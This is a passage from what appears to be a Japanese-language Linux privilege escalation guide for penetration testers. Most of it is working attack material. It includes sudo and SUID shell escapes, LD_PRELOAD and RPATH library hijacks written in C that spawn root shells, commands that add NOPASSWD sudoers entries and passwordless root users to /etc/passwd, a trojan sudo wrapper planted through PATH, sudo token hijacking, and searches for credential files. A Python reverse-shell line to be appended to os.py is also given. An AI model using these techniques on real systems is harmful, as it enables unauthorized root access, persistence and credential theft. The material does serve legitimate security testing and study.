もしあなたが**$PATHのいくつかのフォルダ内に書き込むことができる**ことがわかった場合、**書き込み可能なフォルダ内にバックドアを作成することによって特権を昇格させる**ことができるかもしれません。そのバックドアは、異なるユーザー（理想的にはroot）によって実行されるコマンドの名前であり、**あなたの書き込み可能なフォルダよりも前に位置するフォルダからは読み込まれない**必要があります。

### SUDOとSUID

sudoを使用していくつかのコマンドを実行することが許可されているか、suidビットを持っている可能性があります。それを確認するには：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドにより、ファイルを読み書きしたり、コマンドを実行したりすることができます。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定により、ユーザーはパスワードを知らなくても他のユーザーの権限でいくつかのコマンドを実行できる場合があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `root` として `vim` を実行できます。これにより、ルートディレクトリにsshキーを追加するか、`sh` を呼び出すことでシェルを取得することが簡単になります。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、ユーザーが何かを実行している間に**環境変数を設定する**ことを許可します：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTBマシンAdmirer**に基づいており、スクリプトをrootとして実行する際に任意のPythonライブラリを読み込むための**PYTHONPATHハイジャック**に**脆弱**でした：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo実行バイパスパス

**ジャンプ**して他のファイルを読むか、**シンボリックリンク**を使用します。例えば、sudoersファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
ワイルドカード（\*）が使用されると、さらに簡単になります：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスなしのSudoコマンド/SUIDバイナリ

**sudo権限**が単一のコマンドに**パスを指定せずに**与えられている場合: _hacker10 ALL= (root) less_、PATH変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この技術は、**suid** バイナリが **パスを指定せずに別のコマンドを実行する場合にも使用できます（常に** _**strings**_ **を使って奇妙な SUID バイナリの内容を確認してください）**。

[Payload examples to execute.](payloads-to-execute.md)

### コマンドパスを持つ SUID バイナリ

もし **suid** バイナリが **パスを指定して別のコマンドを実行する場合**、その場合は、suid ファイルが呼び出しているコマンドと同名の **関数をエクスポート** してみることができます。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、関数を作成してエクスポートしてみる必要があります：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
そのため、suidバイナリを呼び出すと、この関数が実行されます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、ローダーによって他のすべてのライブラリ、標準Cライブラリ（`libc.so`）を含む前にロードされる1つ以上の共有ライブラリ（.soファイル）を指定するために使用されます。このプロセスはライブラリのプリロードとして知られています。

しかし、システムのセキュリティを維持し、この機能が特に **suid/sgid** 実行可能ファイルで悪用されるのを防ぐために、システムはいくつかの条件を強制します：

- ローダーは、実ユーザーID (_ruid_) が有効ユーザーID (_euid_) と一致しない実行可能ファイルに対して **LD_PRELOAD** を無視します。
- suid/sgid の実行可能ファイルに対しては、suid/sgid でもある標準パスのライブラリのみがプリロードされます。

特権昇格は、`sudo` でコマンドを実行する能力があり、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という文が含まれている場合に発生する可能性があります。この構成により、**LD_PRELOAD** 環境変数が持続し、`sudo` でコマンドが実行されるときでも認識されるため、特権のある状態で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c**として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に**コンパイルします**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**特権を昇格させる** 実行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が**LD_LIBRARY_PATH**環境変数を制御している場合、同様の特権昇格が悪用される可能性があります。なぜなら、攻撃者はライブラリが検索されるパスを制御しているからです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUIDバイナリ – .soインジェクション

**SUID**権限を持つバイナリに遭遇した際に異常に見える場合、**.so**ファイルが正しく読み込まれているか確認することは良い習慣です。これを確認するには、次のコマンドを実行します:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_“open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (そのようなファイルやディレクトリはありません)”_ のようなエラーに遭遇することは、悪用の可能性を示唆しています。

これを悪用するには、_"/path/to/.config/libcalc.c"_ というCファイルを作成し、次のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルの権限を操作し、特権のあるシェルを実行することで特権を昇格させることを目的としています。

上記のCファイルを共有オブジェクト（.so）ファイルにコンパイルするには：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最終的に、影響を受けたSUIDバイナリを実行すると、エクスプロイトがトリガーされ、システムの侵害の可能性が生じます。

## 共有オブジェクトハイジャック
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUIDバイナリが書き込み可能なフォルダからライブラリを読み込んでいることがわかったので、そのフォルダに必要な名前のライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
エラーが発生した場合、例えば
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
それは、生成したライブラリに `a_function_name` という関数が必要であることを意味します。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できるUnixバイナリのキュレーションされたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに**引数のみを注入できる**場合の同様のリストです。

このプロジェクトは、制限されたシェルから抜け出したり、特権を昇格または維持したり、ファイルを転送したり、バインドシェルやリバースシェルを生成したり、他のポストエクスプロイトタスクを容易にするために悪用できるUnixバイナリの正当な関数を収集します。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}

{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、任意のsudoルールを悪用する方法を見つけられるかどうかを確認できます。

### Sudoトークンの再利用

**sudoアクセス**はあるがパスワードがない場合、**sudoコマンドの実行を待ってからセッショントークンをハイジャックすることで特権を昇格させる**ことができます。

特権を昇格させるための要件：

- "_sampleuser_" としてシェルを持っている
- "_sampleuser_" が**過去15分以内に `sudo`**を使用して何かを実行している（デフォルトでは、これはパスワードを入力せずに `sudo` を使用できるsudoトークンの期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` にアクセス可能である（アップロードできる必要があります）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` で一時的に `ptrace_scope` を有効にするか、`/etc/sysctl.d/10-ptrace.conf` を永続的に変更して `kernel.yama.ptrace_scope = 0` を設定できます）

これらの要件がすべて満たされている場合、**次の方法で特権を昇格させることができます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **最初のエクスプロイト** (`exploit.sh`) は、_/tmp_ にバイナリ `activate_sudo_token` を作成します。これを使用して**セッション内でsudoトークンをアクティブにする**ことができます（自動的にrootシェルは取得できませんので、`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **二番目のエクスプロイト** (`exploit_v2.sh`) は、_ /tmp _ に **setuid を持つ root 所有の sh シェルを作成します**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三のエクスプロイト** (`exploit_v3.sh`) は **sudoersファイルを作成し、sudoトークンを永続化し、すべてのユーザーがsudoを使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ内のファイルに**書き込み権限**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使用して**ユーザーとPIDのためのsudoトークンを作成**できます。\
例えば、ファイル_/var/run/sudo/ts/sampleuser_を上書きでき、PID 1234のそのユーザーとしてシェルを持っている場合、パスワードを知らなくても**sudo権限を取得**できます。
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使用できるか、そしてその方法を設定します。これらのファイルは **デフォルトではユーザー root とグループ root のみが読み取ることができます**。\
**もし** このファイルを **読む** ことができれば、**興味深い情報を取得できる可能性があります**。また、**任意のファイルに書き込む** ことができれば、**特権を昇格させる** ことができます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができれば、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として、OpenBSD の `doas` などがあります。 `/etc/doas.conf` でその設定を確認することを忘れないでください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが通常マシンに接続し、`sudo`を使用して特権を昇格させる**ことを知っていて、そのユーザーコンテキスト内でシェルを取得した場合、**新しいsudo実行可能ファイルを作成**して、あなたのコードをrootとして実行し、その後ユーザーのコマンドを実行させることができます。そして、**ユーザーコンテキストの$PATHを変更**します（例えば、.bash_profileに新しいパスを追加するなど）ので、ユーザーがsudoを実行すると、あなたのsudo実行可能ファイルが実行されます。

ユーザーが異なるシェル（bashではない）を使用している場合は、新しいパスを追加するために他のファイルを変更する必要があることに注意してください。例えば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback)は`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`を変更します。別の例は[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)で見つけることができます。

または、次のようなコマンドを実行します:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **読み込まれた設定ファイルの場所を示します**。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf` からの設定ファイルが読み込まれることを意味します。この設定ファイルは **他のフォルダを指し示し**、そこに **ライブラリ** が **検索される** ことになります。例えば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これは、システムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

何らかの理由で **ユーザーが書き込み権限を持っている** 場所が次のいずれかである場合: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイル内の任意のフォルダ、彼は特権を昇格させることができるかもしれません。\
この誤設定を **どのように悪用するか** を次のページで確認してください:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/`にlibをコピーすることで、`RPATH`変数で指定されたこの場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
`/var/tmp`に`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`を使用して悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilitiesは、**プロセスに利用可能なroot権限のサブセットを提供します**。これにより、rootの**権限がより小さく、独特な単位に分割されます**。これらの単位は、プロセスに独立して付与することができます。この方法で、権限の完全なセットが削減され、悪用のリスクが低下します。\
**capabilitiesとそれを悪用する方法について詳しく学ぶには、以下のページをお読みください**：

{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリ内で、**"execute"のビット**は、影響を受けるユーザーがフォルダに**"cd"**できることを示します。\
**"read"**ビットは、ユーザーが**ファイルをリスト**できることを示し、**"write"**ビットは、ユーザーが**ファイルを削除**および**新しいファイルを作成**できることを示します。

## ACLs

アクセス制御リスト（ACL）は、裁量的権限の二次的な層を表し、**従来のugo/rwx権限を上書きすることができます**。これらの権限は、所有者やグループの一部でない特定のユーザーに対して権利を付与または拒否することにより、ファイルまたはディレクトリへのアクセスをより制御することを可能にします。このレベルの**粒度は、より正確なアクセス管理を保証します**。詳細は[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)で確認できます。

**ユーザー"kali"にファイルに対する読み取りおよび書き込み権限を与えます**：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**特定のACLを持つ**ファイルをシステムから取得します:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## シェルセッションを開く

**古いバージョン**では、他のユーザー（**root**）の**シェル**セッションを**ハイジャック**することができます。\
**最新のバージョン**では、**自分のユーザー**のスクリーンセッションにのみ**接続**できるようになります。しかし、**セッション内に興味深い情報**が見つかるかもしれません。

### スクリーンセッションのハイジャック

**スクリーンセッションのリスト**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションに接続する**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux セッションのハイジャック

これは **古い tmux バージョン** に関する問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションをハイジャックすることはできませんでした。

**tmux セッションのリスト**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションに接続する**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
**Valentine box from HTB**の例を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebianベースのシステム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーは、このバグの影響を受ける可能性があります。\
このバグは、これらのOSで新しいsshキーを作成する際に発生し、**可能な変種は32,768通りのみ**でした。これは、すべての可能性を計算できることを意味し、**ssh公開鍵を持っていれば、対応する秘密鍵を検索できます**。計算された可能性はここで見つけることができます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSHの興味深い設定値

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは`no`です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは`yes`です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、空のパスワード文字列を持つアカウントへのログインをサーバーが許可するかどうかを指定します。デフォルトは`no`です。

### PermitRootLogin

rootがsshを使用してログインできるかどうかを指定します。デフォルトは`no`です。可能な値：

- `yes`: rootはパスワードと秘密鍵を使用してログインできます
- `without-password`または`prohibit-password`: rootは秘密鍵のみでログインできます
- `forced-commands-only`: rootは秘密鍵を使用してのみログインでき、コマンドオプションが指定されている必要があります
- `no`: いいえ

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h`のようなトークンを含むことができ、これはホームディレクトリに置き換えられます。**絶対パス**（`/`で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の **private** キーでログインしようとすると、ssh があなたのキーの公開キーを `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH エージェントフォワーディングを使用すると、**サーバーにキーを置かずに**（パスフレーズなしで！）**ローカルの SSH キーを使用する**ことができます。これにより、ssh **を介してホストに** **ジャンプ**し、そこから **別の** ホストに **ジャンプする**ことができ、**初期ホスト**にある **キー**を使用します。

このオプションを `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
`Host`が`*`の場合、ユーザーが異なるマシンにジャンプするたびに、そのホストはキーにアクセスできるようになります（これはセキュリティの問題です）。

ファイル`/etc/ssh_config`はこの**options**を**override**し、この設定を許可または拒否できます。\
ファイル`/etc/sshd_config`はキーワード`AllowAgentForwarding`を使用してssh-agentフォワーディングを**allow**または**denied**できます（デフォルトはallowです）。

Forward Agentが環境で設定されている場合、次のページを読んでください。**特権を昇格させるために悪用できるかもしれません**：

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル`/etc/profile`および`/etc/profile.d/`内のファイルは、**ユーザーが新しいシェルを実行するときに実行されるスクリプトです**。したがって、これらのいずれかを**書き込むまたは変更することができれば、特権を昇格させることができます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし奇妙なプロファイルスクリプトが見つかった場合は、**機密情報**を確認する必要があります。

### Passwd/Shadowファイル

OSによっては、`/etc/passwd`および`/etc/shadow`ファイルが異なる名前を使用しているか、バックアップが存在する場合があります。したがって、**すべてを見つける**ことをお勧めし、**それらを読み取れるかどうか**を確認して、**ファイル内にハッシュがあるかどうか**を確認してください：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に**パスワードハッシュ**を見つけることができます。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

まず、次のコマンドのいずれかを使用してパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー `hacker` を追加し、生成されたパスワードを追加します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` で `su` コマンドを使用できます。

また、パスワードなしのダミーユーザーを追加するには、次の行を使用できます。\
警告: 現在のマシンのセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

あなたは **いくつかの機密ファイルに書き込むことができるか** 確認する必要があります。例えば、いくつかの **サービス設定ファイル** に書き込むことができますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバーを実行していて、**/etc/systemd/内のTomcatサービス構成ファイルを変更できる**場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたのバックドアは、次回tomcatが起動したときに実行されます。

### フォルダの確認

以下のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（最後のものはおそらく読み取れませんが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最後の数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DBファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **ウェブファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを読むと、**パスワードを含む可能性のあるいくつかのファイル**を検索します。\
**もう一つの興味深いツール**は、[**LaZagne**](https://github.com/AlessandroZ/LaZagne)で、これはWindows、Linux、Mac用にローカルコンピュータに保存された多くのパスワードを取得するために使用されるオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**その中に興味深い/機密情報を見つけることができるかもしれません**。ログが奇妙であればあるほど、興味深いものになるでしょう（おそらく）。\
また、**「悪い」**設定（バックドア？）の**監査ログ**は、この記事で説明されているように、監査ログ内に**パスワードを記録する**ことを許可するかもしれません: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを**読むためにグループ** [**adm**](interesting-groups-linux-pe/#adm-group) は非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 一般的なクレデンシャル検索/正規表現

ファイル名や内容に「**password**」という単語が含まれているファイル、ログ内のIPやメール、またはハッシュの正規表現をチェックする必要があります。\
これらすべての方法をここにリストするつもりはありませんが、興味がある場合は、[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認できます。

## 書き込み可能なファイル

### Pythonライブラリのハイジャック

Pythonスクリプトが実行される**場所**を知っていて、そのフォルダー内に**書き込むことができる**、または**Pythonライブラリを変更できる**場合、OSライブラリを変更してバックドアを仕掛けることができます（Pythonスクリプトが実行される場所に書き込むことができる場合、os.pyライブラリをコピーして貼り付けます）。

ライブラリを**バックドア化する**には、os.pyライブラリの最後に次の行を追加します（IPとPORTを変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotateの悪用

`logrotate`の脆弱性により、ログファイルまたはその親ディレクトリに**書き込み権限**を持つユーザーが特権を昇格させる可能性があります。これは、`logrotate`がしばしば**root**として実行され、特に_**/etc/bash_completion.d/**_のようなディレクトリで任意のファイルを実行するように操作できるためです。ログローテーションが適用されるディレクトリだけでなく、_var/log_内の権限も確認することが重要です。

> [!NOTE]
> この脆弱性は`logrotate`バージョン`3.18.0`およびそれ以前のバージョンに影響します。

脆弱性に関する詳細情報はこのページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

この脆弱性は[**logrotten**](https://github.com/whotwagner/logrotten)を使用して悪用できます。

この脆弱性は[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginxログ)**に非常に似ているため、ログを変更できることがわかった場合は、誰がそのログを管理しているかを確認し、ログをシンボリックリンクで置き換えることで特権を昇格できるかどうかを確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

